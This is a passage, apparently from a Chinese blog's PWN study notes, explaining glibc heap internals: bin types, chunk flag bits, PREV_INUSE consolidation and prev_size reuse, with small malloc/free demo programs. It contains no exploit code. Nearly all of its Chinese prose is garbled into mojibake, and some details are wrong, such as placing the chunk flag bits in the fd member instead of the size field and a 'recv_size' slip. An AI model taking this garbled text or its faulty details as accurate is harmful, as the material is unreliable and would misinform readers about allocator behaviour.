chunkç›¸é‚»çš„æ—¶å€™ï¼Œç³»ç»Ÿä¹Ÿä¸ä¼šè¿›è¡Œè‡ªåŠ¨åˆå¹¶æ“ä½œï¼Œè€Œæ˜¯ä¿ç•™ä¸¤è€…ã€‚è™½ç„¶è¿™æ ·åšå¯èƒ½ä¼šé€ æˆé¢å¤–çš„ç¢ç‰‡åŒ–é—®é¢˜ï¼Œä½†ç‘•ä¸æ©ç‘œ</li><li>LIFO</li></ul><blockquote><h3 id="fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š"><a href="#fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š" class="headerlink" title="fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š"></a>fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š</h3><ul><li>æ¯ä¸ªfast biné“¾è¡¨éƒ½æ˜¯å•é“¾è¡¨ï¼ˆä½¿ç”¨fdæŒ‡é’ˆï¼‰ã€‚å› æ­¤ï¼Œfast binä¸­æ— è®ºæ˜¯æ·»åŠ è¿˜æ˜¯ç§»é™¤fast chunkï¼Œéƒ½æ˜¯å¯¹â€œé“¾è¡¨å°¾â€è¿›è¡Œæ“ä½œï¼Œè€Œä¸ä¼šå¯¹æŸä¸ªä¸­é—´çš„fast chunkè¿›è¡Œæ“ä½œ</li><li>å•ä¸ªfastbiné“¾è¡¨ä¸­çš„chunkå¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ªfastbiné“¾è¡¨ä¸­çš„chunkå¤§å°æ˜¯ä¸åŒçš„</li></ul><p><img src="/2020/12/15/%E5%A0%86/2019072416485849.png" alt="img"></p></blockquote><h4 id="3-unsorted-bin"><a href="#3-unsorted-bin" class="headerlink" title="3.unsorted bin"></a>3.unsorted bin</h4><p>å½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„chunkçš„æ—¶å€™ï¼Œå¦‚æœç³»ç»Ÿæ²¡æœ‰å°†å®ƒä»¬æ·»åŠ åˆ°å¯¹åº”çš„binsä¸­ï¼Œç³»ç»Ÿå°±å°†è¿™äº›chunkæ·»åŠ åˆ°unsorted binä¸­ã€‚åœ¨å †ç®¡ç†å™¨çš„unsorted bin ä¸ä¸ºç©ºæ—¶ï¼Œ<strong>ç”¨æˆ·ç”³è¯·éfast binå¤§å°çš„å†…å­˜</strong>ä¼šå…ˆä»unsorted binä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°ç¬¦åˆè¯¥ç”³è¯·å¤§å°è¦æ±‚çš„chunkï¼Œåˆ™ç›´æ¥åˆ†é…æˆ–åˆ†å‰²è¯¥chunkã€‚</p><ul><li>unsorted binçš„ä¸ªæ•°ï¼š 1ä¸ª</li><li>unsorted binæ˜¯ä¸€ä¸ªç”±free chunksç»„æˆçš„å¾ªç¯åŒé“¾è¡¨</li><li>åœ¨unsorted binä¸­ï¼Œå¯¹chunkçš„å¤§å°å¹¶æ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•å¤§å°çš„chunkéƒ½å¯ä»¥å½’å±åˆ°unsorted binä¸­</li><li>unsortedbiné‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</li></ul><p><img src="file://C:\Users\86138\Music\hexo\source\_posts\PWNå­¦ä¹ \image-20201119163232880.png?lastModify=1607780072" alt="image-20201119163232880"></p><h4 id="4-small-bin"><a href="#4-small-bin" class="headerlink" title="4.small bin"></a>4.small bin</h4><p><strong>æ¦‚å¿µ</strong>ï¼šå°äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunkç§°ä¹‹ä¸ºsmall chunkï¼Œsmall binå°±æ˜¯ç”¨äºç®¡ç†small chunkçš„</p><ul><li>small biné“¾è¡¨çš„ä¸ªæ•°ä¸º62ä¸ª</li><li>FIFO</li><li><strong>å¾ªç¯åŒå‘é“¾è¡¨</strong>ï¼Œå°±å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾é€Ÿåº¦è€Œè¨€ï¼Œsmall binæ¯”larger binå¿«ï¼Œä½†æ¯”fast binæ…¢</li></ul><blockquote><p><strong>Small biné“¾è¡¨</strong></p><ul><li>æ¯ä¸ªsmallbinä¹Ÿæ˜¯ä¸€ä¸ªç”±å¯¹åº”free chunkç»„æˆçš„å¾ªç¯åŒé“¾è¡¨</li><li><strong>small biné‡‡ç”¨FIFO(å…ˆå…¥å…ˆå‡º)ç®—æ³•ï¼š</strong>å†…å­˜é‡Šæ”¾æ“ä½œå°±å°†æ–°é‡Šæ”¾çš„chunkæ·»åŠ åˆ°é“¾è¡¨çš„front end(å‰ç«¯)ï¼Œåˆ†é…æ“ä½œå°±ä»é“¾è¡¨çš„rear end(å°¾ç«¯)ä¸­è·å–chunk</li><li>å•ä¸ªsmallbiné“¾è¡¨ä¸­çš„chunkå¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ªsmallbiné“¾è¡¨ä¸­çš„chunkå¤§å°æ˜¯ä¸åŒçš„ï¼Œè·ŸfastbinsYæ•°ç»„å­˜å‚¨fastbiné“¾çš„åŸç†æ˜¯ç›¸åŒçš„</li></ul><p><img src="/2020/12/15/%E5%A0%86/201907300808254.png" alt="img"></p></blockquote><h4 id="5-large-bin"><a href="#5-large-bin" class="headerlink" title="5.large bin"></a>5.large bin</h4><p><strong>æ¦‚å¿µï¼š</strong>å¤§äºç­‰äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunkç§°ä¹‹ä¸ºlarge chunkï¼Œlarge binå°±æ˜¯ç”¨äºç®¡ç†è¿™äº›largechunkçš„</p><ul><li>large biné“¾è¡¨çš„ä¸ªæ•°ä¸º63ä¸ªï¼Œè¢«åˆ†ä¸º6ç»„</li><li>largechunkä½¿ç”¨fd_nextsizeã€bk_nextsizeè¿æ¥èµ·æ¥çš„</li></ul><blockquote><h3 id="Large-Biné“¾è¡¨"><a href="#Large-Biné“¾è¡¨" class="headerlink" title="Large Biné“¾è¡¨"></a>Large Biné“¾è¡¨</h3><ul><li>åŒä¸€ä¸ªlargebinä¸­æ¯ä¸ªchunkçš„å¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œè¿™äº›chunkæ ¹æ®ä¸€å®šçš„èŒƒå›´å­˜å‚¨åœ¨ä¸€ä¸ªlarbiné“¾è¡¨ä¸­</li><li>large chunkå¯ä»¥æ·»åŠ ã€åˆ é™¤åœ¨large binçš„ä»»ä½•ä¸€ä¸ªä½ç½®</li><li><strong>åœ¨è¿™63ä¸ªlargebinsä¸­ï¼š</strong>ç¬¬ä¸€ç»„çš„32ä¸ªlargebiné“¾<strong>ä¾æ¬¡ä»¥64å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼Œå³ç¬¬ä¸€ä¸ªlargebiné“¾ä¸­chunksizeä¸º1024-1087å­—èŠ‚ï¼Œç¬¬äºŒä¸ªlarge binä¸­chunk sizeä¸º1088~1151å­—èŠ‚ã€‚</strong>ç¬¬äºŒç»„çš„16ä¸ªlargebiné“¾<strong>ä¾æ¬¡ä»¥512å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼›</strong>ç¬¬ä¸‰ç»„çš„8ä¸ªlargebiné“¾<strong>ä»¥æ­¥é•¿4096ä¸ºé—´éš”ï¼›</strong>ç¬¬å››ç»„çš„4ä¸ªlargebiné“¾<strong>ä»¥32768å­—èŠ‚ä¸ºé—´éš”ï¼›</strong>ç¬¬äº”ç»„çš„2ä¸ªlargebiné“¾<strong>ä»¥262144å­—èŠ‚ä¸ºé—´éš”ï¼›</strong>æœ€åä¸€ç»„**çš„largebiné“¾ä¸­çš„chunkå¤§å°æ— é™åˆ¶</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190730154304263.png" alt="img"></p></blockquote><p><img src="/2020/12/15/%E5%A0%86/20190724174830502.png" alt="img"></p><h3 id="0x06-å †çš„è°ƒç”¨æµç¨‹"><a href="#0x06-å †çš„è°ƒç”¨æµç¨‹" class="headerlink" title="0x06 å †çš„è°ƒç”¨æµç¨‹"></a>0x06 å †çš„è°ƒç”¨æµç¨‹</h3><p><img src="/2020/12/15/%E5%A0%86/20190722153928310.png" alt="img"></p><ul><li><h4 id="å½“åº”ç”¨ç¨‹åºâ€œç¬¬ä¸€æ¬¡â€ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š"><a href="#å½“åº”ç”¨ç¨‹åºâ€œç¬¬ä¸€æ¬¡â€ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š" class="headerlink" title="å½“åº”ç”¨ç¨‹åºâ€œç¬¬ä¸€æ¬¡â€ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š"></a>å½“åº”ç”¨ç¨‹åº<strong>â€œç¬¬ä¸€æ¬¡â€</strong>ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š</h4></li><li><p>glibcç”³è¯·åˆ°è¿™å—å¤§çš„å†…å­˜ä¹‹åï¼Œæ ¹æ®mallocéœ€è¦çš„å¤§å°ï¼Œç„¶ååˆ‡å‰²ç›¸åº”çš„å¤§å°ç»™åº”ç”¨ç¨‹åºmallocå‡½æ•°ä½¿ç”¨</p></li><li><p>å½“åº”ç”¨å±‚freeä¹‹åï¼Œä¼šå°†åˆšæ‰ä½¿ç”¨åˆ°çš„åŠ¨æ€å†…å­˜è¿”å›ç»™glibcï¼Œä½†æ˜¯è¿”å›çš„å†…å­˜ä¸æ˜¯è¿”å›ç»™top chunkï¼Œè€Œæ˜¯ç”±binsé“¾ç®¡ç†</p></li><li><p>å½“ç¨‹åºå†æ¬¡mallocæ—¶ï¼Œä¼šä»åˆšæ‰ç”³è¯·çš„å¾ˆå¤§çš„åŠ¨æ€å†…å­˜å»å–ï¼Œä¸ä¼šå†å»å‘å†…æ ¸ç”³è¯·å†…å­˜</p></li><li><p>åªæœ‰å½“ç¬¬ä¸€æ¬¡ç”³è¯·çš„åŠ¨æ€å†…å­˜ä½¿ç”¨å®Œæ—¶ï¼Œglibcæ‰ä¼šå†æ¬¡é€šè¿‡brk/mmapç³»ç»Ÿè°ƒç”¨å‘å†…æ ¸å»è¦å†…å­˜</p></li></ul><h3 id="0x07-chunkçš„æ ‡å¿—ä½"><a href="#0x07-chunkçš„æ ‡å¿—ä½" class="headerlink" title="0x07 chunkçš„æ ‡å¿—ä½"></a>0x07 chunkçš„æ ‡å¿—ä½</h3><h4 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1.ç®€ä»‹"></a>1.ç®€ä»‹</h4><ul><li><strong>NON_MAIN_ARENAï¼š</strong>è®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹</li><li><strong>IS_MAPPEDï¼š</strong>è®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±mmapåˆ†é…çš„</li><li><strong>PREV_INUSEï¼š</strong>å¦‚æœå‰é¢ä¸€ä¸ªchunkå¤„äºåˆ†é…çŠ¶æ€ï¼Œé‚£ä¹ˆæ­¤ä½ä¸º1ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ªchunk çš„size çš„Pä½ä¸º0æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—²chunkä¹‹é—´çš„åˆå¹¶</li></ul><h4 id="2-å®ç°"><a href="#2-å®ç°" class="headerlink" title="2.å®ç°"></a>2.å®ç°</h4><ul><li><strong>åœ¨64ä½ç³»ç»Ÿä¸­ä¸º16å­—èŠ‚å¯¹é½</strong>ï¼Œ<strong>åœ¨32ä½çš„ç³»ç»Ÿä¸­ä¸º8å­—èŠ‚å¯¹é½</strong>ã€‚å› æ­¤åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œstruct malloc_chunkç»“æ„ä½“çš„å¤§å°çš„æœ€å4ä¸ªä½æ•°æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„ï¼Œ32ä½ç³»ç»Ÿä¸­ï¼Œæœ€å3ä¸ªä½æ•°æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„ã€‚</li></ul><p><img src="/2020/12/15/%E5%A0%86/2019072217303470.png" alt="img"></p><ul><li>æ‰€ä»¥ï¼Œglibcç”¨struct malloc_chunkç»“æ„ä½“çš„fdæˆå‘˜çš„æœ€å3ä¸ªæ¯”ç‰¹ä½æ¥è¡¨ç¤ºå½“å‰chunkå¤„äºä»€ä¹ˆçŠ¶æ€ã€‚åªéœ€è¦å°†fdæˆå‘˜ç›¸åº”çš„æ¯”ç‰¹ä½ç½®ä¸º1ï¼Œå°±å¯ä»¥ä»£è¡¨å½“å‰chunkå¤„äºä»€ä¹ˆçŠ¶æ€</li></ul><h4 id="3-PREV-INUSEä½å¯¼è‡´çš„chunkåˆå¹¶"><a href="#3-PREV-INUSEä½å¯¼è‡´çš„chunkåˆå¹¶" class="headerlink" title="3.PREV_INUSEä½å¯¼è‡´çš„chunkåˆå¹¶"></a>3.PREV_INUSEä½å¯¼è‡´çš„chunkåˆå¹¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = prev_size (p);                   <span class="comment">//1</span></span><br><span class="line">        <span class="built_in">size</span> += prevsize;                           <span class="comment">//2</span></span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//3</span></span><br><span class="line">        unlink(av, p, bck, fwd);                    <span class="comment">//4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆä½¿ç”¨prev_inuseå®å®šä¹‰åˆ¤æ–­pçš„PREV_INUSEä½æ˜¯å¦ä¸º0</li><li>å¦‚æœPREV_INUSEä½ä¸º0ï¼Œé‚£ä¹ˆprev_inuseå®è¿”å›0ï¼Œifæ¡ä»¶ä¸º1ï¼Œè¿›å…¥ifè¯­å¥ä½“ä¸­</li><li>1.é€šè¿‡recv_sizeå‡½æ•°å¾—åˆ°å‰é¢è¦åˆå¹¶çš„chunkçš„å¤§å°</li><li>2.å°†è‡ªå·±çš„å¤§å°ä¸å‰é¢çš„presizeç›¸åŠ å¾—åˆ°åˆå¹¶åçš„chunkçš„å¤§å°</li><li>3.å°†pçš„æŒ‡é’ˆå‘å‰ç§»åŠ¨ï¼Œç§»åŠ¨åˆ°å‰é¢é‚£ä¸ªchunkçš„å¼€å¤´å¤„</li><li>4.unlinkæ˜¯å°†ä¸¤ä¸ªè¦åˆå¹¶çš„chunkå„è‡ªä»åŸæ¥çš„biné“¾ä¸Šé¢æ–­ä¸‹æ¥ï¼Œç„¶åè¿›è¡Œåˆå¹¶</li></ul><h4 id="4-fast-chunkçš„PREV-INUSE"><a href="#4-fast-chunkçš„PREV-INUSE" class="headerlink" title="4.fast chunkçš„PREV_INUSE"></a>4.fast chunkçš„PREV_INUSE</h4><ul><li>â‘ æ— è®ºfastchunkå‰é¢çš„chunkæ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€ï¼ŒPREV_INUSEå§‹ç»ˆä¸º1ã€‚å› ä¸ºç³»ç»Ÿä¸å¸Œæœ›fastchunkä¸å‰é¢çš„chunkä¹‹é—´è¿›è¡Œåˆå¹¶</li><li>â‘¡ä¸è®ºå½“å‰çš„fastchunkæ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€ï¼Œè¯¥chunkåé¢çš„chunkçš„PREV_INUSEä½ä¸€å®šä¸º1ï¼Œä¹Ÿæ˜¯ä¸ºäº†é˜²æ­¢åé¢çš„chunkä¸fastchunkåˆå¹¶</li></ul><h4 id="5-æ¼”ç¤º"><a href="#5-æ¼”ç¤º" class="headerlink" title="5.æ¼”ç¤º"></a>5.æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x70</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//ä¸ºäº†è¾¾åˆ°æ¼”ç¤ºæ•ˆæœï¼Œé˜²æ­¢åˆå¹¶åçš„chunkä¸top chunkåˆå¹¶</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">    <span class="built_in">free</span>(p2);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ­£å¥½åˆ†é…äº†3å—</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183532647.png" alt="image-20201214183532647"></p><p>çœ‹ä¸€ä¸‹å†…å­˜åœ°å€</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183701946.png" alt="image-20201214183701946"></p><p>å½“æˆ‘ä»¬é‡Šæ”¾ä¸€ä¸ªä¹‹å</p><p>è¿™é‡Œç‰ˆæœ¬è¾ƒé«˜  æ·¦ æˆ‘å…ˆå»æ‰¾ä¸ªè™šæ‹Ÿæœº</p><p>å¯ä»¥çœ‹åˆ°æ˜¯åŠ åˆ°tcacheä¸­</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183930779.png" alt="image-20201214183930779"></p><hr><p>å¼„äº†ä¸€æ™šä¸Š æˆ‘åˆå›æ¥äº†</p><p>é‡Šæ”¾ç¬¬ä¸€ä¸ª</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214221400402.png" alt="image-20201214221400402"></p><p>é‡Šæ”¾ä¸¤ä¸ª</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214221458119.png" alt="image-20201214221458119"></p><h3 id="0x08-chunkçš„mchunk-prev-sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨"><a href="#0x08-chunkçš„mchunk-prev-sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨" class="headerlink" title="0x08 chunkçš„mchunk_prev_sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨"></a>0x08 chunkçš„mchunk_prev_sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨</h3><h4 id="1-ä»‹ç»"><a href="#1-ä»‹ç»" class="headerlink" title="1.ä»‹ç»"></a>1.ä»‹ç»</h4><ul><li>â‘ å¦‚æœæœ¬chunkå‰é¢ä¸€ä¸ªchunkå¤„äºç©ºé—²çŠ¶æ€ï¼Œé‚£ä¹ˆmchunk_prev_sizeæˆå‘˜æ‰æœ‰ç”¨ï¼Œæ­¤æ—¶ç”¨æ¥è®°å½•å‰ä¸€ä¸ªchunkçš„å¤§å°</li><li>â‘¡å¦‚æœæœ¬chunkå‰é¢ä¸€ä¸ªchunkå¤„äºä½¿ç”¨çŠ¶æ€ï¼Œé‚£ä¹ˆmchunk_prev_sizeæˆå‘˜å¯¹äºæœ¬chunkæ¥è¯´æ˜¯ä¸ä½¿ç”¨çš„</li></ul><h4 id="2-å®ç°-1"><a href="#2-å®ç°-1" class="headerlink" title="2.å®ç°"></a>2.å®ç°</h4><ul><li>å½“å‰ä¸€ä¸ªchunkç”³è¯·çš„æ•°æ®ç©ºé—´ç”³è¯·çš„å¤§å°å¯¹16å–ä½™åï¼Œå¦‚æœå¤šå‡ºæ¥çš„å¤§å°å°äºç­‰äº8å­—èŠ‚ï¼Œé‚£ä¹ˆè¿™ä¸ªå¤šå‡ºæ¥çš„å¤§å°å°±æ”¾å…¥ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeä¸­å­˜å‚¨</li><li>å¦åˆ™ï¼Œå¦‚æœå¤šå‡ºæ¥çš„å¤§å°å¤§äº8å­—èŠ‚ï¼Œé‚£ä¹ˆå‰ä¸€ä¸ªchunkå°±ä¸ä½¿ç”¨ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeæˆå‘˜</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190724195005380.png" alt="img"></p><h4 id="3-æ¼”ç¤º"><a href="#3-æ¼”ç¤º" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x108</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0x108æ¨¡0x10ä¹‹åè¿˜æœ‰8 è¯´æ˜æ˜¯å ç”¨äº†ä¸‹ä¸€ä¸ªchunkçš„pre_size</p><p>64ä½16å­—èŠ‚å¯¹é½ 0x100(åˆ†é…)+0x10(å¤´)+0x1(P)</p></blockquote><p><img src="/2020/12/15/%E5%A0%86/image-20201214190713309.png" alt="image-20201214190713309"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x109</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0x109æ¨¡0x10ä¸º9 æ‰€ä»¥pre_sizeä¸å¤Ÿç”¨ éœ€è¦å¤šç”³è¯·1ä¸ªå•å…ƒ</p><p>chunkè¢«éšå¼å¯¹é½ä½0x110</p><p>64ä½16å­—èŠ‚å¯¹é½ 0x110+0x10+0x1</p></blockquote><p><img src="/2020/12/15/%E5%A0%86/image-20201214191149578.png" alt="image-20201214191149578"></p><h3 id="0x09-chunkçš„å¤§å°"><a href="#0x09-chunkçš„å¤§å°" class="headerlink" title="0x09 chunkçš„å¤§å°"></a>0x09 chunkçš„å¤§å°</h3><p>å…¶å®ä¸Šä¸€èŠ‚æˆ‘ä»¬å°±æ¼”ç¤ºäº† ä½†è¿™ä¸€èŠ‚è¿˜æ˜¯é‡ç‚¹è®²ä¸€ä¸‹</p><h4 id="1-chunkçš„å®é™…å¤§å°"><a href="#1-chunkçš„å®é™…å¤§å°" class="headerlink" title="1.chunkçš„å®é™…å¤§å°"></a>1.chunkçš„å®é™…å¤§å°</h4><ul><li>å½“ç”¨æˆ·é€šè¿‡mallocå‡½æ•°ç”³è¯·å †å†…å­˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨çš„å†…å­˜çš„èµ·å§‹åœ°å€æ˜¯ä»fdæˆå‘˜å¼€å§‹çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æ— æ³•è®¿é—®ç»“æ„ä½“çš„å‰ä¸¤ä¸ªæˆå‘˜</li><li>å½“ç”¨æˆ·ç”³è¯·sizeå¤§å°çš„å †å—æ—¶ï¼Œåœ¨glibcä¸­æœ¬è´¨ä¸Šæ˜¯ç”³è¯·äº†size+16å¤§å°ï¼ˆ64ä½ç³»ç»Ÿä¸­ï¼‰çš„å†…å­˜ï¼Œå› ä¸ºè¦åŠ ä¸Šå‰ä¸¤ä¸ªæˆå‘˜</li><li>ä¾‹å¦‚ï¼šmalloc(0x10);ç”³è¯·äº†0x10å¤§å°çš„å †å†…å­˜ï¼Œæœ¬è´¨ä¸Šåœ¨glibcä¸­ç”³è¯·äº†0x10+0x10=0x20å¤§å°çš„ç©ºé—´</li><li><strong>chunkçš„å®é™…å¤§å°=mallocçš„å¤§å°+chunkçš„å‰ä¸¤ä¸ªæˆå‘˜+mchunk_prev_sizeæˆå‘˜çš„åˆå¹¶æ“ä½œ+chunkå¯¹é½è§„åˆ™</strong></li></ul><p>è¿™ä¸ªä¸Šé¢æ¼”ç¤ºè¿‡äº† å°±ä¸æ¼”ç¤ºäº†</p><h4 